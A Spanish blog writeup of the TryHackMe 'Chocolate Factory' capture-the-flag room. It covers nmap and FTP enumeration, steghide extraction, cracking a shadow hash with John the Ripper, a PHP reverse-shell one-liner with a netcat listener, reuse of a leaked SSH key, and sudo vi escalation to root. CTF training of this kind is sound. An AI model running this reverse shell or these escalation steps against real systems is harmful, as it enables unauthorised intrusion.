---
title: Try Hack Me - Chocolate Factory - Writeup
date: 2022-09-27 10:30:00 +0800
categories: ["Try Hack Me"]
tags: [thm, writeups]     # TAG names should always be lowercase
---

En esta guía vamos a resolver el room [Chocolate Factory](https://tryhackme.com/room/chocolatefactory) de [THM](https://tryhackme.com) creado por [AndyInfosec](https://andyinfosec.com/) en el que aplicaremos técnicas de enumeración, estenografía, escalado de privilegios y otras curiosidades.

Dentro música.

## Inicio

La descripción disponible en el room, en principio, no aporta gran información, así que iniciamos la máquina y enumeramos con **nmap**.

## Enumeración

Teniendo en cuenta que se trata de un room sencillo lanzamos un **nmap** básico, que se ejecutará rápido, para ver qué datos obtenemos. De quedarnos cortos, en pasos posteriores podremos lanzar un escaneo de mayor calado.

```console
┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/ChocolateFactory]
└─$ nmap -Pn 10.10.31.2
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-27 09:31 CEST
Nmap scan report for 10.10.31.2
Host is up (0.078s latency).
Not shown: 989 closed tcp ports (conn-refused)
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
80/tcp  open  http
100/tcp open  newacct
106/tcp open  pop3pw
109/tcp open  pop2
110/tcp open  pop3
111/tcp open  rpcbind
113/tcp open  ident
119/tcp open  nntp
125/tcp open  locus-map

Nmap done: 1 IP address (1 host up) scanned in 1.30 seconds
```

Del volcado de **nmap** nos centramos en los puertos básicos:

* *21/tcp*: con un servicio **ftp** detrás.
* *22/tcp*: con un servicio **ssh** detrás.
* *80/tcp*: con un servicio **http** detrás.

Tenemos dos líneas de trabajo para empezar: el servicio **ftp** y el servicio **http**.

Arrancamos con el **ftp**.

## FTP

Enumeramos con más detalle este puerto con **nmap**.

```console
┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/ChocolateFactory]
└─$ nmap -sC -sV -p 21 10.10.31.2
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-27 10:56 CEST
Nmap scan report for 10.10.31.2
Host is up (0.059s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.18.xx.xx
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-rw-r--    1 1000     1000       208838 Sep 30  2020 gum_room.jpg
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 2.97 seconds
```

OK. Tenemos *ftp-anon: Anonymous FTP login allowed (FTP code 230)* y un fichero *.jpg* disponible. Vamos a ver qué podemos sacar.

```console
┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/ChocolateFactory]
└─$ ftp 10.10.31.2
Connected to 10.10.31.2.
220 (vsFTPd 3.0.3)
Name (10.10.31.2:oliverio): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||58018|)
150 Here comes the directory listing.
-rw-rw-r--    1 1000     1000       208838 Sep 30  2020 gum_room.jpg
226 Directory send OK.
ftp> get gum_room.jpg
local: gum_room.jpg remote: gum_room.jpg
229 Entering Extended Passive Mode (|||57566|)
150 Opening BINARY mode data connection for gum_room.jpg (208838 bytes).
100% |*************************************************************************************************************************|   203 KiB  696.87 KiB/s    00:00 ETA
226 Transfer complete.
208838 bytes received in 00:00 (515.08 KiB/s)
ftp>
```

Con el fichero en local tiramos de [**steghide**](https://steghide.sourceforge.net/documentation/manpage_es.php), una aplicación de estenografía que nos permite extraer, de haberla, información oculta en un fichero de imagen como es nuestro caso.

Lo primero, chequeamos si el fichero en cuestión tiene algo embebido.

```console
┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/ChocolateFactory]
└─$ steghide info gum_room.jpg       
"gum_room.jpg":
  format: jpeg
  capacity: 10.9 KB
Try to get information about embedded data ? (y/n) y
Enter passphrase: 
  embedded file "b64.txt":
    size: 2.5 KB
    encrypted: rijndael-128, cbc
    compressed: yes
```

Vamos bien, tenemos algo. Utilizamos **steghide** para extraerlo.

Spoiler: nos pide una frase de paso, le damos a ENTER dado que no tenemos nada parecido.

```console
┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/ChocolateFactory]
└─$ steghide extract -sf gum_room.jpg
Enter passphrase:
wrote extracted data to "b64.txt".
```

OK. Hemos conseguido extraer el fichero con el nombre `64.txt` que se encontraba oculto en la imagen. Lo abrimos pasando la salida a Base64.

```console
┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/ChocolateFactory]
└─$ cat b64.txt | base64 -d
daemon:*:18380:0:99999:7:::
bin:*:18380:0:99999:7:::
sys:*:18380:0:99999:7:::
sync:*:18380:0:99999:7:::
games:*:18380:0:99999:7:::
[...]
statd:*:18451:0:99999:7:::
_gvm:*:18496:0:99999:7:::
charlie:$6$CZJn<EDITADO>999:7:::
```

Bien, se trata de una copia del fichero `/etc/shadow`. Copiamos la clave correspondiente al usuario *charlie* en un fichero con el nombre `charly.txt` y lo guardamos en nuestro directorio de trabajo para atacarlo con nuestro amigo **John the Ripper**.

> **Tip:** Tened la precaución de copiar la línea completa, desde *charlie* hasta *7:::*

> **Tip 2:** Tened paciencia, tarda lo suyo en devolvernos el resultado.

```console
┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/ChocolateFactory]
└─$ john charly.txt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:02:07 0.88% (ETA: 13:42:55) 0g/s 1172p/s 1172c/s 1172C/s ilovelloyd..harun
0g 0:00:03:55 1.61% (ETA: 13:44:39) 0g/s 1152p/s 1152c/s 1152C/s ishii..iluvdre
0g 0:00:06:42 2.77% (ETA: 13:43:09) 0g/s 1148p/s 1148c/s 1148C/s teamoda..tati2008
0g 0:00:07:27 3.08% (ETA: 13:43:08) 0g/s 1144p/s 1144c/s 1144C/s fuckdude..frenchclass
0g 0:00:07:44 3.19% (ETA: 13:43:50) 0g/s 1138p/s 1138c/s 1138C/s bloomer1..blaine08
0g 0:00:10:21 4.24% (ETA: 13:45:28) 0g/s 1123p/s 1123c/s 1123C/s andre34..anabel13
<EDITADO>           (charlie)
1g 0:00:14:52 DONE (2022-09-27 09:56) 0.001120g/s 1102p/s 1102c/s 1102C/s cocker6..cn123
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
**john** nos devuelve la contraseña del usuario *charlie* con lo que tenemos resuelto el segundo desafío del room (*What is Charlie's password?*).

Recordando que tenemos el puerto **ssh** probamos a ver si hay suerte utilizando estas credenciales.

```console
┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/ChocolateFactory]
└─$ ssh charlie@10.10.31.2
charlie@10.10.31.2's password: 
Permission denied, please try again.
```

No tira :(. Toca abrir la segunda linea de trabajo: el puerto **http**.

## HTTP

Abrimos navegador y cargamos IP.

![](/assets/posts/20220927/img01.png)

Probamos con las credenciales que hemos obtenido y entramos.

![](/assets/posts/20220927/img02.png)

Miel sobre hojuelas. Lanzamos un **ls** a ver qué nos devuelve.

![](/assets/posts/20220927/img03.png)

En el listado nos aparece el fichero `key_rev_key`.

Lanzamos un comando `cat key_rev_key`.

![](/assets/posts/20220927/img04.png)

Probamos con `strings key_rev_key`.

![](/assets/posts/20220927/img05.png)

Mirad con atención que hay una de las flags allí (*Enter the key you found!*).

Visto lo anterior, vamos a ejecutar una shell reversa basada en php. Yo utilicé la siguiente:

```console
php -r '$sock=fsockopen("10.18.xx.xx",4321);exec("/bin/sh -i <&3 >&3 2>&3");'
```

Abrimos un nuevo Terminal y ponemos a escuchar **netcat**.

```console
┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/ChocolateFactory]
└─$ nc -lvnp 4321
```

Copiamos el comando de php en la caja y le damos a Execute ...

```console
┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/ChocolateFactory]
└─$ nc -lvnp 4321
listening on [any] 4321 ...
connect to [10.18.xx.xx] from (UNKNOWN) [10.10.31.2] 54208
/bin/sh: 0: can't access tty; job control turned off
$ 
```

Bingo, estamos dentro. Toca trastear. Lo primero es upgradear la shell.

```console
┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/ChocolateFactory]
└─$ nc -lvnp 4321
listening on [any] 4321 ...
connect to [10.18.xx.xx] from (UNKNOWN) [10.10.31.2] 54208
/bin/sh: 0: can't access tty; job control turned off
$ script -qc /bin/bash /dev/null
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

www-data@chocolate-factory:/var/www/html$ 
```

Listamos y abrimos `validate.php` a ver si nos ofrece algo.

```console
www-data@chocolate-factory:/var/www/html$ ls
ls
home.jpg  image.png   index.php.bak  validate.php
home.php  index.html  key_rev_key
www-data@chocolate-factory:/var/www/html$ cat validate.php
cat validate.php
<?php
        $uname=$_POST['uname'];
        $password=$_POST['password'];
        if($uname=="charlie" && $password=="<EDITADO>"){
                echo "<script>window.location='home.php'</script>";
        }
        else{
                echo "<script>alert('Incorrect Credentials');</script>";
                echo "<script>window.location='index.html'</script>";
        }
?>www-data@chocolate-factory:/var/www/html$ 
```

La password de *chralie*, nada nuevo. Nos movemos ...

```console
www-data@chocolate-factory:/var/www/html$ cd /home
cd /home
www-data@chocolate-factory:/home$ ls -la
ls -la
total 12
drwxr-xr-x  3 root    root    4096 Oct  1  2020 .
drwxr-xr-x 24 root    root    4096 Sep  1  2020 ..
drwxr-xr-x  5 charlie charley 4096 Oct  7  2020 charlie
www-data@chocolate-factory:/home$ cd charlie
cd charlie
www-data@chocolate-factory:/home/charlie$ ls -la
ls -la
total 40
drwxr-xr-x 5 charlie charley 4096 Oct  7  2020 .
drwxr-xr-x 3 root    root    4096 Oct  1  2020 ..
-rw-r--r-- 1 charlie charley 3771 Apr  4  2018 .bashrc
drwx------ 2 charlie charley 4096 Sep  1  2020 .cache
drwx------ 3 charlie charley 4096 Sep  1  2020 .gnupg
drwxrwxr-x 3 charlie charley 4096 Sep 29  2020 .local
-rw-r--r-- 1 charlie charley  807 Apr  4  2018 .profile
-rw-r--r-- 1 charlie charley 1675 Oct  6  2020 teleport
-rw-r--r-- 1 charlie charley  407 Oct  6  2020 teleport.pub
-rw-r----- 1 charlie charley   39 Oct  6  2020 user.txt
www-data@chocolate-factory:/home/charlie$ cat user.txt
cat user.txt
cat: user.txt: Permission denied
www-data@chocolate-factory:/home/charlie$ 
```

El usuario que tenemos, *www-data*, no tiene permisos. Probamos con los otros ficheros.

```console
www-data@chocolate-factory:/home/charlie$ cat teleport
cat teleport
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA4adrPc3Uh98RYDrZ8CUBDgWLENUybF60lMk9YQOBDR+gpuRW
1AzL12K35/Mi3Vwtp0NSwmlS7ha4y9sv2kPXv8lFOmLi1FV2hqlQPLw/unnEFwUb
L4KBqBemIDefV5pxMmCqqguJXIkzklAIXNYhfxLr8cBS/HJoh/7qmLqrDoXNhwYj
[...]
Jq4xAoGBAIQnMPLpKqBk/ZV+HXmdJYSrf2MACWwL4pQO9bQUeta0rZA6iQwvLrkM
Qxg3lN2/1dnebKK5lEd2qFP1WLQUJqypo5TznXQ7tv0Uuw7o0cy5XNMFVwn/BqQm
G2QwOAGbsQHcI0P19XgHTOB7Dm69rP9j1wIRBOF7iGfwhWdi+vln
-----END RSA PRIVATE KEY-----
www-data@chocolate-factory:/home/charlie$ 
```

OK, tenemos la clave RSA privada. La copiamos completa a un fichero en local, lo guardamos en nuestro directorio de trabajo como `id_rsa` y le ajustamos los permisos.

```console
┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/ChocolateFactory]
└─$ chmod 600 id_rsa
```

Una vez hecho, abrimos un nuevo terminal y probamos a acceder por **ssh** utilizando esta clave.

```console
┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/ChocolateFactory]
└─$ ssh -i id_rsa charlie@10.10.31.2
The authenticity of host '10.10.31.2 (10.10.31.2)' can't be established.
ED25519 key fingerprint is SHA256:WwycVD8zBUVfJS6sNVj192MU3Q7P4rylVnanjGx/Q5U.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.31.2' (ED25519) to the list of known hosts.
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-115-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue Sep 27 07:56:10 UTC 2022

  System load:  0.08              Processes:           605
  Usage of /:   43.6% of 8.79GB   Users logged in:     0
  Memory usage: 60%               IP address for eth0: 10.10.31.2
  Swap usage:   0%

0 packages can be updated.
0 updates are security updates.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Last login: Wed Oct  7 16:10:44 2020 from 10.0.2.5
Could not chdir to home directory /home/charley: No such file or directory
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

charlie@chocolate-factory:/$
```

Estamos dentro con el usuario *charlie*. Seguimos.

```console
charlie@chocolate-factory:/$
charlie@chocolate-factory:/$ cd /home/charlie
charlie@chocolate-factory:/home/charlie$ ls -la
total 40
drwxr-xr-x 5 charlie charley 4096 Oct  7  2020 .
drwxr-xr-x 3 root    root    4096 Oct  1  2020 ..
-rw-r--r-- 1 charlie charley 3771 Apr  4  2018 .bashrc
drwx------ 2 charlie charley 4096 Sep  1  2020 .cache
drwx------ 3 charlie charley 4096 Sep  1  2020 .gnupg
drwxrwxr-x 3 charlie charley 4096 Sep 29  2020 .local
-rw-r--r-- 1 charlie charley  807 Apr  4  2018 .profile
-rw-r--r-- 1 charlie charley 1675 Oct  6  2020 teleport
-rw-r--r-- 1 charlie charley  407 Oct  6  2020 teleport.pub
-rw-r----- 1 charlie charley   39 Oct  6  2020 user.txt
charlie@chocolate-factory:/home/charlie$ cat user.txt
flag{<EDITADO>}
```

Obtenemos la flag del usuario. Toca escalar.

## Escaldo de privilegios

Para esto tiramos de los clásicos.

```console
charlie@chocolate-factory:/home/charlie$ sudo -l
Matching Defaults entries for charlie on chocolate-factory:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User charlie may run the following commands on chocolate-factory:
    (ALL : !root) NOPASSWD: /usr/bin/vi
charlie@chocolate-factory:/home/charlie$
```

Nos cuentan que podemos ejecutar **vi** como root.

Nos vamos a [GTFObins](https://gtfobins.github.io), buscamos por **vi** y le damos al botoncito **sudo**.

![](/assets/posts/20220927/img06.png)

Pues allá que vamos.

```console
charlie@chocolate-factory:/home/charlie$ sudo vi -c ':!/bin/sh' /dev/null

# 
# ls -la
total 40
drwxr-xr-x 5 charlie charley 4096 Oct  7  2020 .
drwxr-xr-x 3 root    root    4096 Oct  1  2020 ..
-rw-r--r-- 1 charlie charley 3771 Apr  4  2018 .bashrc
drwx------ 2 charlie charley 4096 Sep  1  2020 .cache
drwx------ 3 charlie charley 4096 Sep  1  2020 .gnupg
drwxrwxr-x 3 charlie charley 4096 Sep 29  2020 .local
-rw-r--r-- 1 charlie charley  807 Apr  4  2018 .profile
-rw-r--r-- 1 charlie charley 1675 Oct  6  2020 teleport
-rw-r--r-- 1 charlie charley  407 Oct  6  2020 teleport.pub
-rw-r----- 1 charlie charley   39 Oct  6  2020 user.txt
# cd /root
# ls -la
total 40
drwx------  6 root    root    4096 Oct  7  2020 .
drwxr-xr-x 24 root    root    4096 Sep  1  2020 ..
-rw-------  1 root    root       0 Oct  7  2020 .bash_history
-rw-r--r--  1 root    root    3106 Apr  9  2018 .bashrc
drwx------  3 root    root    4096 Oct  1  2020 .cache
drwx------  3 root    root    4096 Sep 30  2020 .gnupg
drwxr-xr-x  3 root    root    4096 Sep 29  2020 .local
-rw-r--r--  1 root    root     148 Aug 17  2015 .profile
-rwxr-xr-x  1 charlie charley  491 Oct  1  2020 root.py
-rw-r--r--  1 root    root      66 Sep 30  2020 .selected_editor
drwx------  2 root    root    4096 Sep  1  2020 .ssh
#
```

Ups !. No nos encotramos con el típico fichero *root.txt*. En su lugar nos han dejado un *root.py*. Lo abrimos a ver qué contiene.

```console
# cat root.py
from cryptography.fernet import Fernet
import pyfiglet
key=input("Enter the key:  ")
f=Fernet(key)
encrypted_mess= 'gAAAAABfdb52eejIlEaE9ttPY8ckMMfHTIw5lamAWMy8yEdGPhnm9_H_yQikhR-bPy09-NVQn8lF_PDXyTo-T7CpmrFfoVRWzlm0OffAsUM7KIO_xbIQkQojwf_unpPAAKyJQDHNvQaJ'
dcrypt_mess=f.decrypt(encrypted_mess)
mess=dcrypt_mess.decode()
display1=pyfiglet.figlet_format("You Are Now The Owner Of ")
display2=pyfiglet.figlet_format("Chocolate Factory ")
print(display1)
print(display2)
print(mess)# 
```

El script implementa [Fernet](https://cryptography.io/en/latest/fernet/), un método de encriptación que requiere una clave.

Para los que no hayáis detectado la respuesta al primer desafío del room que nos aparecía utilizando `strings key_rev_key` desde el navegador (es cierto que sale medio oculta), vamos a intentarlo aprovechando el acceso con el que contamos ahora. Volveremos al *root.py* más adelante.

```console
# cd /var/www/html/
# ls -la
total 1152
drwxr-xr-x 2 root    root       4096 Oct  6  2020 .
drwxr-xr-x 3 root    root       4096 Sep 29  2020 ..
-rw-rw-r-- 1 charlie charley   65719 Sep 30  2020 home.jpg
-rw-rw-r-- 1 charlie charley     695 Sep 30  2020 home.php
-rw-rw-r-- 1 charlie charley 1060347 Sep 30  2020 image.png
-rw-rw-r-- 1 charlie charley    1466 Oct  1  2020 index.html
-rw-rw-r-- 1 charlie charley     273 Sep 29  2020 index.php.bak
-rw-r--r-- 1 charlie charley    8496 Sep 30  2020 key_rev_key
-rw------- 1 root    root      12288 Oct  1  2020 .swp
-rw-rw-r-- 1 charlie charley     303 Sep 30  2020 validate.php
# strings key_rev_key
/lib64/ld-linux-x86-64.so.2
libc.so.6
__isoc99_scanf
puts
[...]
Enter your name: 
laksdhfas
 congratulations you have found the key:   
b'-Vk<EDITADO>GSQzY='
 Keep its safe
Bad name!
;*3$"
[...]
.data
.bss
.comment
# 
```

OK, hemos conseguido la key que nos pide el script de Python. Probamos.

```console
# python root.py
Enter the key:  b'-Vk<EDITADO>GSQzY='
__   __               _               _   _                 _____ _
\ \ / /__  _   _     / \   _ __ ___  | \ | | _____      __ |_   _| |__   ___
 \ V / _ \| | | |   / _ \ | '__/ _ \ |  \| |/ _ \ \ /\ / /   | | | '_ \ / _ \
  | | (_) | |_| |  / ___ \| | |  __/ | |\  | (_) \ V  V /    | | | | | |  __/
  |_|\___/ \__,_| /_/   \_\_|  \___| |_| \_|\___/ \_/\_/     |_| |_| |_|\___|

  ___                              ___   __
 / _ \__      ___ __   ___ _ __   / _ \ / _|
| | | \ \ /\ / / '_ \ / _ \ '__| | | | | |_
| |_| |\ V  V /| | | |  __/ |    | |_| |  _|
 \___/  \_/\_/ |_| |_|\___|_|     \___/|_|


  ____ _                     _       _
 / ___| |__   ___   ___ ___ | | __ _| |_ ___
| |   | '_ \ / _ \ / __/ _ \| |/ _` | __/ _ \
| |___| | | | (_) | (_| (_) | | (_| | ||  __/
 \____|_| |_|\___/ \___\___/|_|\__,_|\__\___|

 _____          _
|  ___|_ _  ___| |_ ___  _ __ _   _
| |_ / _` |/ __| __/ _ \| '__| | | |
|  _| (_| | (__| || (_) | |  | |_| |
|_|  \__,_|\___|\__\___/|_|   \__, |
                              |___/

flag{<EDITADO>}
#
```

Nos hacemos con la flag de *root* y resolvemos la sala.

Espero que esta guía os haya servido de ayuda.

Saludos he intentar ser felices.

> **Nota final:** Una vez terminé el room me di cuenta de que había una vía quizás más sencilla para llegar a resolverlo. Os la dejo a continuación.

Lanzando un escaneo de ficheros sobre el servidor con **feroxbuster** obtenemos lo siguiente. (Por cuestiones de sencillez corté el escaneo antes de que terminase)

```console
┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/ChocolateFactory]
└─$ feroxbuster -u http://10.10.31.2 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 100 --extensions php txt html --status-codes 200 302

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.59.122
 🚀  Threads               │ 100
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 👌  Status Codes          │ [200, 302]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 💲  Extensions            │ [php, txt, html]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET       69l      131w     1466c http://10.10.59.122/
200      GET       69l      131w     1466c http://10.10.59.122/index.html
200      GET       32l       48w      569c http://10.10.59.122/home.php
200      GET        1l        2w       93c http://10.10.59.122/validate.php
🚨 Caught ctrl+c 🚨 saving scan state to ferox-http_10_10_59_122-1664275853.state ...
[#>------------------] - 7m    110283/1764368 1h      found:4       errors:4340   
[#>------------------] - 7m     60540/882184  131/s   http://10.10.59.122 
[#>------------------] - 7m     60296/882184  131/s   http://10.10.59.122/ 
```

Entre los ficheros que nos descubre esta `home.php`, el fichero detrás de la página desde la que podemos lanzar comandos directamente, incluída una shell reversa.

A partir de aquí, los pasos serían bastante similares a los que hemos visto.